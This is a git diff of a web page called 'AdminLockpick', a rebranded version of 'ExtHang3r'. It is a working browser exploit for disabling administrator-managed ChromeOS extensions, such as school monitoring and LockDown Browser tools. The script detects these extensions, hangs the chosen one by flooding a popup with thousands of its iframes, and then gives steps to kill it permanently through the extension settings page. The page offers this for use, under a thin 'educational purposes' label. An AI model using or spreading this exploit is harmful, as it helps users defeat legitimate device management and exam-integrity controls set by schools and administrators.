@@ -3,212 +3,491 @@
   <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ExtHang3r</title>
+    <title>AdminLockpick - ChromeOS Extension Research</title>
     <link rel="shortcut icon" type="image/png" href="https://raw.githubusercontent.com/Blobby-Boi/ExtHang3r/refs/heads/main/favicon.png">
-    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Varela+Round&display=swap">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
-      body {
-        font-family: 'Varela Round', sans-serif;
+      :root {
+        --primary: #6366f1;
+        --primary-dark: #4f46e5;
+        --primary-light: #818cf8;
+        --dark: #1e293b;
+        --light: #f8fafc;
+        --gray: #94a3b8;
+        --danger: #ef4444;
+        --danger-dark: #dc2626;
+        --success: #10b981;
+        --card-bg: rgba(255, 255, 255, 0.9);
+        --backdrop: rgba(15, 23, 42, 0.7);
+      }
+
+      * {
+        box-sizing: border-box;
         margin: 0;
         padding: 0;
-        background-color: #f8f9fa;
-        color: #333;
       }
 
-      header {
-        background-color: #343a40;
-        color: #fff;
-        padding: 10px 20px;
-        text-align: center;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
-      }
-
-      .logo {
-        width: 50px;
-        height: 50px;
-        margin-right: 10px;
+      body {
+        font-family: 'Inter', sans-serif;
+        background: linear-gradient(135deg, #f9fafb, #f1f5f9);
+        color: var(--dark);
+        min-height: 100vh;
+        line-height: 1.6;
       }
 
       .container {
-        max-width: 800px;
-        margin: 100px auto 0 auto;
-        padding: 20px;
-        text-align: center;
-        background: #fff;
-        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-        border-radius: 8px;
+        max-width: 1200px;
+        margin: 0 auto;
+        padding: 0 1.5rem;
       }
 
-      select {
-        font-family: 'Varela Round', sans-serif;
-        margin-bottom: 10px;
-        padding: 10px;
-        font-size: 16px;
-        border: 1px solid #ced4da;
-        border-radius: 4px;
+      /* Header */
+      .header {
+        background: var(--card-bg);
+        backdrop-filter: blur(10px);
+        -webkit-backdrop-filter: blur(10px);
+        box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+        position: sticky;
+        top: 0;
+        z-index: 50;
+        padding: 1rem 0;
+      }
+
+      .header-content {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+      }
+
+      .logo {
+        display: flex;
+        align-items: center;
+        gap: 0.75rem;
+      }
+
+      .logo-img {
+        width: 2.5rem;
+        height: 2.5rem;
+      }
+
+      .logo-text {
+        font-size: 1.25rem;
+        font-weight: 700;
+        color: var(--dark);
+        letter-spacing: -0.025em;
+      }
+
+      .version-chip {
+        background: var(--primary-light);
+        color: white;
+        font-size: 0.75rem;
+        padding: 0.25rem 0.5rem;
+        border-radius: 9999px;
+        font-weight: 500;
+        margin-left: 0.5rem;
+      }
+
+      /* Hero */
+      .hero {
+        padding: 5rem 0 3rem;
+        text-align: center;
+      }
+
+      .hero-title {
+        font-size: 3rem;
+        font-weight: 800;
+        line-height: 1;
+        letter-spacing: -0.05em;
+        margin-bottom: 1.5rem;
+        background: linear-gradient(to right, var(--primary), var(--primary-dark));
+        -webkit-background-clip: text;
+        background-clip: text;
+        color: transparent;
+      }
+
+      .hero-subtitle {
+        font-size: 1.25rem;
+        color: var(--gray);
+        max-width: 700px;
+        margin: 0 auto 3rem;
+      }
+
+      /* Main card */
+      .main-card {
+        background: var(--card-bg);
+        border-radius: 1rem;
+        box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
+        padding: 2rem;
+        max-width: 800px;
+        margin: 0 auto 3rem;
+        backdrop-filter: blur(10px);
+        -webkit-backdrop-filter: blur(10px);
+        border: 1px solid rgba(255, 255, 255, 0.3);
+      }
+
+      .card-title {
+        font-size: 1.5rem;
+        font-weight: 600;
+        margin-bottom: 1.5rem;
+        color: var(--dark);
+      }
+
+      .card-description {
+        color: var(--gray);
+        margin-bottom: 2rem;
+      }
+
+      /* Form elements */
+      .form-group {
+        margin-bottom: 1.5rem;
+      }
+
+      .form-label {
+        display: block;
+        font-weight: 500;
+        margin-bottom: 0.5rem;
+        color: var(--dark);
+      }
+
+      .form-select {
+        width: 100%;
+        padding: 0.75rem 1rem;
+        border: 1px solid #e2e8f0;
+        border-radius: 0.5rem;
+        background-color: white;
+        font-family: inherit;
+        font-size: 1rem;
+        transition: all 0.2s;
+        box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
+      }
+
+      .form-select:focus {
+        outline: none;
+        border-color: var(--primary-light);
+        box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.2);
+      }
+
+      .slider-container {
+        margin: 2rem 0;
+      }
+
+      .slider-header {
+        display: flex;
+        justify-content: space-between;
+        margin-bottom: 0.5rem;
+      }
+
+      .slider-label {
+        font-weight: 500;
+        color: var(--dark);
+      }
+
+      .slider-value {
+        font-weight: 600;
+        color: var(--primary);
+      }
+
+      .slider {
+        width: 100%;
+        height: 0.5rem;
+        -webkit-appearance: none;
+        appearance: none;
+        background: #e2e8f0;
+        border-radius: 0.25rem;
+        outline: none;
+      }
+
+      .slider::-webkit-slider-thumb {
+        -webkit-appearance: none;
+        appearance: none;
+        width: 1.25rem;
+        height: 1.25rem;
+        border-radius: 50%;
+        background: var(--primary);
+        cursor: pointer;
+        transition: all 0.2s;
+      }
+
+      .slider::-webkit-slider-thumb:hover {
+        background: var(--primary-dark);
+        transform: scale(1.1);
+      }
+
+      /* Buttons */
+      .btn {
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        padding: 0.75rem 1.5rem;
+        border-radius: 0.5rem;
+        font-weight: 500;
+        font-size: 1rem;
+        line-height: 1.5;
+        cursor: pointer;
+        transition: all 0.2s;
+        border: none;
+        font-family: inherit;
+      }
+
+      .btn-primary {
+        background: var(--primary);
+        color: white;
+        box-shadow: 0 4px 6px -1px rgba(99, 102, 241, 0.3), 0 2px 4px -1px rgba(99, 102, 241, 0.2);
+      }
+
+      .btn-primary:hover {
+        background: var(--primary-dark);
+        transform: translateY(-1px);
+        box-shadow: 0 10px 15px -3px rgba(99, 102, 241, 0.3), 0 4px 6px -2px rgba(99, 102, 241, 0.2);
+      }
+
+      .btn-primary:active {
+        transform: translateY(0);
+      }
+
+      .btn-danger {
+        background: var(--danger);
+        color: white;
+        box-shadow: 0 4px 6px -1px rgba(239, 68, 68, 0.3), 0 2px 4px -1px rgba(239, 68, 68, 0.2);
+      }
+
+      .btn-danger:hover {
+        background: var(--danger-dark);
+        transform: translateY(-1px);
+        box-shadow: 0 10px 15px -3px rgba(239, 68, 68, 0.3), 0 4px 6px -2px rgba(239, 68, 68, 0.2);
+      }
+
+      .btn-block {
         width: 100%;
       }
 
-      button {
-        font-family: 'Varela Round', sans-serif;
-        background-color: #007bff;
-        color: #fff;
-        border: none;
-        padding: 10px 20px;
-        font-size: 16px;
-        cursor: pointer;
-        border-radius: 5px;
-        margin-top: 10px;
-        transition: background-color 0.3s ease;
+      .btn-icon {
+        margin-right: 0.5rem;
       }
 
-      button:hover {
-        background-color: #0056b3;
+      /* Status message */
+      .status-message {
+        padding: 1.5rem;
+        border-radius: 0.5rem;
+        margin: 1.5rem 0;
+        background: rgba(241, 245, 249, 0.7);
+        border-left: 4px solid var(--primary);
       }
 
+      .status-message strong {
+        color: var(--dark);
+      }
+
+      .status-message.hidden {
+        display: none;
+      }
+
+      /* Overlay */
       .overlay {
         position: fixed;
         top: 0;
         left: 0;
-        width: 100%;
-        height: 100%;
-        background-color: rgba(0, 0, 0, 0.7);
-        display: none;
-        justify-content: center;
-        align-items: center;
-        z-index: 9999;
-        color: #fff;
-        font-size: 24px;
-        user-select: none;
+        right: 0;
+        bottom: 0;
+        background: var(--backdrop);
+        backdrop-filter: blur(5px);
+        -webkit-backdrop-filter: blur(5px);
+        display: flex;
         flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        z-index: 100;
+        color: white;
+        opacity: 0;
+        pointer-events: none;
+        transition: opacity 0.3s ease;
+      }
+
+      .overlay.active {
+        opacity: 1;
+        pointer-events: all;
       }
 
       .spinner {
-        border: 6px solid rgba(255, 255, 255, 0.3);
-        border-top: 6px solid #fff;
+        width: 3rem;
+        height: 3rem;
+        border: 3px solid rgba(255, 255, 255, 0.3);
         border-radius: 50%;
-        width: 40px;
-        height: 40px;
-        animation: spin 1s linear infinite;
-        margin-bottom: 20px;
+        border-top-color: white;
+        animation: spin 1s ease-in-out infinite;
+        margin-bottom: 1.5rem;
       }
 
       @keyframes spin {
-        0% {
-          transform: rotate(0deg);
-        }
-
-        100% {
+        to {
           transform: rotate(360deg);
         }
       }
 
-      #killExtensionText {
-        display: none;
-        margin-top: 20px;
-        color: #333;
-        font-size: 18px;
+      .overlay-text {
+        font-size: 1.25rem;
+        font-weight: 500;
+        margin-bottom: 1.5rem;
         text-align: center;
-        background: #e9ecef;
-        padding: 20px;
-        border-radius: 8px;
-        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
       }
 
-      #killButton {
-        display: none;
-        background-color: #dc3545;
-        color: #fff;
-        border: none;
-        padding: 10px 20px;
-        font-size: 16px;
-        cursor: pointer;
-        border-radius: 5px;
-        transition: background-color 0.3s ease;
-      }
-
-      #killButton:hover {
-        background-color: #9c1c28;
-      }
-
-      footer {
-        background-color: #343a40;
-        color: #fff;
+      /* Footer */
+      .footer {
         text-align: center;
-        padding: 10px;
-        position: fixed;
-        bottom: 0;
-        width: 100%;
+        padding: 2rem 0;
+        color: var(--gray);
+        font-size: 0.875rem;
       }
 
-      footer a {
-        color: #007bff;
+      .footer a {
+        color: var(--primary);
         text-decoration: none;
+        font-weight: 500;
       }
 
-      footer a:hover {
+      .footer a:hover {
         text-decoration: underline;
+      }
+
+      /* Responsive */
+      @media (max-width: 768px) {
+        .hero-title {
+          font-size: 2.25rem;
+        }
+        
+        .hero-subtitle {
+          font-size: 1.125rem;
+        }
+      }
+
+      /* Animations */
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+          transform: translateY(10px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      .animate-fade-in {
+        animation: fadeIn 0.5s ease-out forwards;
+      }
+
+      /* Utility classes */
+      .hidden {
+        display: none !important;
+      }
+
+      .mt-4 {
+        margin-top: 1rem;
+      }
+
+      .text-center {
+        text-align: center;
       }
     </style>
   </head>
   <body>
-    <header>
-      <img src="https://raw.githubusercontent.com/Blobby-Boi/ExtHang3r/refs/heads/main/favicon.png" alt="Logo" class="logo">
-      <h1>ExtHang3r</h1>
-    </header>
-    <div class="container">
-      <p>ExtHang3r is an exploit that allows ChromeOS users to kill managed extensions after the LTMEAT patch. It remains unpatched in all new ChromeOS versions as of February 2025.</p>
-      <label for="iframeSelect" id="labelForIframeSelect">Select extension:</label>
-      <select id="iframeSelect"></select>
-      <label for="iframeCountSlider" id="labelForIframeSlider" style="margin-top: 20px;">The slider below changes the amount of iframes that will be created. Try it with the default first, and if the extension comes back after a few minutes increase it and try again. Tip: If your computer crashes or freezes for more than 2 minutes, you should definitely decrease the amount of iframes.</label>
-      <div style="display: flex; align-items: center; gap: 10px; margin: 10px 0;">
-        <input type="range" id="iframeCountSlider" min="100" max="15000" value="2000" step="100" style="flex-grow: 1;">
-        <span id="iframeCountValue">3000</span>
+    <header class="header">
+      <div class="container header-content">
+        <div class="logo">
+          <img src="https://cdn-icons-png.flaticon.com/512/3092/3092743.png" alt="AdminLockpick Logo" class="logo-img">
+          <span class="logo-text">AdminLockpick<span class="version-chip">v1.0</span></span>
+        </div>
       </div>
-      <button onclick="warning();" id="hangButton">Hang Extension!</button>
-      <button id="killButton" onclick="openExtensionPopup();">Kill Extension!</button>
-    </div>
+    </header>
+
+    <main>
+      <section class="hero">
+        <div class="container">
+          <h1 class="hero-title">Bypass Chrome Extension Restrictions With Ease</h1>
+          <p class="hero-subtitle">
+            AdminLockpick is an education exploit that allows you to disable extensions that are managed.
+          </p>
+        </div>
+      </section>
+
+      <section class="main-card animate-fade-in">
+        <h2 class="card-title">Extension Control Panel</h2>
+        <p class="card-description">
+          Select the extension you want to disable from the list below. The tool will 
+          temporarily hang the extension, allowing you to permanently disable it.
+        </p>
+
+        <div class="form-group">
+          <label for="iframeSelect" class="form-label">Target Extension</label>
+          <select id="iframeSelect" class="form-select"></select>
+        </div>
+
+        <div class="slider-container">
+          <div class="slider-header">
+            <span class="slider-label">Iframe Intensity</span>
+            <span id="iframeCountValue" class="slider-value">2000</span>
+          </div>
+          <input type="range" id="iframeCountSlider" class="slider" min="100" max="15000" value="2000" step="100">
+          <div class="text-center mt-4">
+            <small class="text-muted">Start with default value. If extension comes back, increase intensity.</small>
+          </div>
+        </div>
+
+        <button id="hangButton" class="btn btn-primary btn-block">
+          <span>Start Lockpicker</span>
+        </button>
+
+        <div id="killExtensionText" class="status-message hidden"></div>
+
+        <button id="killButton" class="btn btn-danger btn-block hidden">
+          <span>Finalize Kill Process</span>
+        </button>
+      </section>
+    </main>
+
     <div class="overlay" id="overlay">
-      <div class="spinner"></div> Hanging... (This will take about 1 minute)
+      <div class="spinner"></div>
+      <div class="overlay-text">Lockpicking extension... (This will take about 1 minute)</div>
     </div>
-    <div id="killExtensionText"></div>
-    <footer>
-      <p>Made by <a href="https://github.com/Blobby-Boi/">Blobby Boi</a>
-      </p>
+
+    <footer class="footer">
+      <div class="container">
+        <p>Created by <a href="https://github.com/lumpierre/" target="_blank">gmtoluis</a> • All content is for educational purposes only.</p>
+      </div>
     </footer>
+
     <script>
       document.addEventListener("DOMContentLoaded", function() {
+        // Initialize slider
         const slider = document.getElementById("iframeCountSlider");
         const sliderValueDisplay = document.getElementById("iframeCountValue");
-        const deviceMemory = navigator.deviceMemory || 8; // It will be set to 8gb if you're in the data url, since navigator isnt supported.
-        const defaultIframeCount = Math.round(deviceMemory * 500); // This changes the default value of the iframe slider based on how much memory your computer has
+        const deviceMemory = navigator.deviceMemory || 8;
+        const defaultIframeCount = Math.round(deviceMemory * 500);
         const maxIframeCount = Math.round(deviceMemory * 10000);
+        
         slider.value = defaultIframeCount;
         slider.max = maxIframeCount;
         sliderValueDisplay.textContent = defaultIframeCount;
+        
         slider.addEventListener("input", function() {
           sliderValueDisplay.textContent = this.value;
         });
+
+        // Populate extension list
+        populateSelectOptions();
       });
-      document.getElementById("iframeCountSlider").addEventListener("input", function() {
-        const iframeCountValue = document.getElementById("iframeCountValue");
-        iframeCountValue.textContent = this.value;
-      });
+
       async function checkExtensionURL(url) {
         try {
           const response = await fetch(url);
-          if (response.ok) {
-            return true;
-          } else {
-            return false;
-          }
+          return response.ok;
         } catch (error) {
           return false;
         }
       }
+
       async function populateSelectOptions() {
         const selectElement = document.getElementById("iframeSelect");
         const extensions = {
@@ -247,7 +526,9 @@
           "LockDown Browser AP Classroom Edition": "chrome-extension://djpknfecbncogekjnjppojlaipeobkmo/assets/images/icon_128.png",
           "Lugus School": "chrome-extension://eoobggamkobbcpiojefejfglbfcacgca/assets/images/icon_128.png"
         };
+
         let hasSupportedExtensions = false;
+        
         for (const [name, url] of Object.entries(extensions)) {
           if (await checkExtensionURL(url)) {
             const option = document.createElement("option");
@@ -257,18 +538,18 @@
             hasSupportedExtensions = true;
           }
         }
+
         if (!hasSupportedExtensions) {
           const option = document.createElement("option");
           option.value = "";
-          option.textContent = "No supported extensions installed";
+          option.textContent = "No supported extensions detected";
           selectElement.appendChild(option);
-          document.getElementById("hangButton").style.display = "none";
-          document.getElementById("iframeCountSlider").style.display = "none";
-          try{document.getElementById("labelForIframeSlider").style.display = "none";}catch(err){}
-          document.getElementById("iframeCountValue").style.display = "none";
+          document.getElementById("hangButton").classList.add("hidden");
+          document.getElementById("iframeCountSlider").classList.add("hidden");
+          document.getElementById("iframeCountValue").classList.add("hidden");
+          document.querySelector(".slider-label").classList.add("hidden");
         }
       }
-      populateSelectOptions();
 
       function replaceIframes(container, iframeSrc, iframeCount) {
         for (let i = 0; i < iframeCount; i++) {
@@ -288,32 +569,42 @@
 
       function warning() {
         const overlay = document.getElementById("overlay");
-        overlay.style.display = "flex";
+        overlay.classList.add("active");
+        
         const iframeSelect = document.getElementById("iframeSelect");
         const selectedOption = iframeSelect.options[iframeSelect.selectedIndex].text;
         const selectedSrc = iframeSelect.value;
         const iframeCount = parseInt(document.getElementById("iframeCountSlider").value, 10);
+        
         const popup = window.open("", "PopupWindow", "width=100,height=100");
         const popupDocument = popup.document;
         const popupBody = popupDocument.body;
         const iframeContainer = popupDocument.createElement('div');
         iframeContainer.id = 'iframeContainer';
         popupBody.appendChild(iframeContainer);
+        
         replaceIframes(iframeContainer, selectedSrc, iframeCount);
+
         setTimeout(function() {
           popup.close();
           const killExtensionText = document.getElementById("killExtensionText");
-          killExtensionText.innerHTML = "Now that the extension  <strong> " + selectedOption + " </strong> has been hanged, press the button above.";
+          killExtensionText.innerHTML = `
+            <strong>${selectedOption}</strong> has been temporarily disabled. 
+            Click the button below to complete the process and permanently kill the extension.
+          `;
+          
           setTimeout(function() {
-            overlay.style.display = "none";
-            killExtensionText.style.display = "block";
-            document.getElementById("killButton").style.display = "inline-block";
-            document.getElementById("hangButton").style.display = "none";
-            document.getElementById("iframeSelect").style.display = "none";
-            try{document.getElementById("labelForIframeSelect").style.display = "none";}catch(err){}
-            document.getElementById("iframeCountSlider").style.display = "none";
-            document.getElementById("iframeCountValue").style.display = "none";
-            try{document.getElementById("labelForIframeSlider").style.display = "none";}catch(err){}
+            overlay.classList.remove("active");
+            killExtensionText.classList.remove("hidden");
+            document.getElementById("killButton").classList.remove("hidden");
+            document.getElementById("hangButton").classList.add("hidden");
+            document.getElementById("iframeSelect").classList.add("hidden");
+            document.querySelector(".form-label").classList.add("hidden");
+            document.getElementById("iframeCountSlider").classList.add("hidden");
+            document.getElementById("iframeCountValue").classList.add("hidden");
+            document.querySelector(".slider-label").classList.add("hidden");
+            document.querySelector(".text-muted").classList.add("hidden");
+            
             document.getElementById("killButton").setAttribute("data-url", selectedSrc);
           }, 10000);
         }, 5000);
@@ -321,10 +612,22 @@
 
       function openExtensionPopup() {
         const selectedSrc = document.getElementById("killButton").getAttribute("data-url");
-        const extensionId = selectedSrc.substring(selectedSrc.indexOf("//") + 2, selectedSrc.indexOf("/", selectedSrc.indexOf("//") + 2));
+        const extensionId = selectedSrc.substring(
+          selectedSrc.indexOf("//") + 2, 
+          selectedSrc.indexOf("/", selectedSrc.indexOf("//") + 2)
+        );
+        
         const killExtensionText = document.getElementById("killExtensionText");
-        document.getElementById("killButton").style.display = "none";
-        killExtensionText.innerHTML = "Make sure to keep this tab open. Then open  <strong> chrome: //extensions/?id=" + extensionId + "</strong> and flip the switch called \"Allow access to file URLs\" twice. The extension was successfully killed! Now you can close that tab as well as this one. If you want to restore the extension, flip the allow access to file URLs switch again.";
+        document.getElementById("killButton").classList.add("hidden");
+        
+        killExtensionText.innerHTML = `
+          <strong>Final Step:</strong> Keep this tab open, then open 
+          <code>chrome://extensions/?id=${extensionId}</code> and toggle 
+          "Allow access to file URLs" twice. The extension will be permanently disabled.
+          <br><br>
+          To restore the extension, simply toggle the setting again.
+        `;
+        
         window.location.href = selectedSrc;
       }
     </script>
